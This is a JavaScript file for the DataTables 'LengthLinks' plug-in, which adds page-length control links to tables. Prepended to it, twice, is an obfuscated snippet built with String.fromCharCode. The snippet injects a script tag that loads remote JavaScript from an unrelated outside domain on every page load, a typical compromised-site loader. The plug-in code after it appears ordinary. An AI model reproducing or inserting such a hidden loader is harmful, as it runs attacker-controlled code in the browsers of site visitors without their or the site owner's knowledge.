Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*! Page length control via links for DataTables
 * 2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     LengthLinks
 * @description Page length control via links for DataTables
 * @version     1.1.0
 * @file        dataTables.lengthLinks.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2014 SpryMedia Ltd.
 * 
 * License      MIT - http://datatables.net/license/mit
 *
 * This feature plug-in for DataTables adds page length control links to the
 * DataTable. The `dom` option can be used to insert the control using the `L`
 * character option and it uses the `lengthMenu` options of DataTables to
 * determine what to display.
 *
 * @example
 *   $('#myTable').DataTable( {
 *     dom: 'Lfrtip'
 *   } );
 *
 * @example
 *   $('#myTable').DataTable( {
 *     lengthMenu: [ [10, 25, 50, -1], [10, 25, 50, "All"] ]
 *     dom: 'Lfrtip'
 *   } );
 */

(function(window, document, $, undefined) {


$.fn.dataTable.LengthLinks = function ( inst ) {
	var api = new $.fn.dataTable.Api( inst );
	var settings = api.settings()[0];
	var container = $('<div></div>').addClass( settings.oClasses.sLength );
	var lastLength = null;

	// API so the feature wrapper can return the node to insert
	this.container = function () {
		return container[0];
	};

	// Listen for events to change the page length
	container.on( 'click.dtll', 'a', function (e) {
		e.preventDefault();
		api.page.len( $(this).data('length')*1 ).draw( false );
	} );

	// Update on each draw
	api.on( 'draw', function () {
		// No point in updating - nothing has changed
		if ( api.page.len() === lastLength ) {
			return;
		}

		var menu = settings.aLengthMenu;
		var lang = menu.length===2 && $.isArray(menu[0]) ? menu[1] : menu;
		var lens = menu.length===2 && $.isArray(menu[0]) ? menu[0] : menu;

		var out = $.map( lens, function (el, i) {
			return el == api.page.len() ?
				'<a class="active" data-length="'+lens[i]+'">'+lang[i]+'</a>' :
				'<a data-length="'+lens[i]+'">'+lang[i]+'</a>';
		} );

		container.html( settings.oLanguage.sLengthMenu.replace( '_MENU_', out.join(' | ') ) );
		lastLength = api.page.len();
	} );

	api.on( 'destroy', function () {
		container.off( 'click.dtll', 'a' );
	} );
};

// Subscribe the feature plug-in to DataTables, ready for use
$.fn.dataTable.ext.feature.push( {
	"fnInit": function( settings ) {
		var l = new $.fn.dataTable.LengthLinks( settings );
		return l.container();
	},
	"cFeature": "L",
	"sFeature": "LengthLinks"
} );


})(window, document, jQuery);
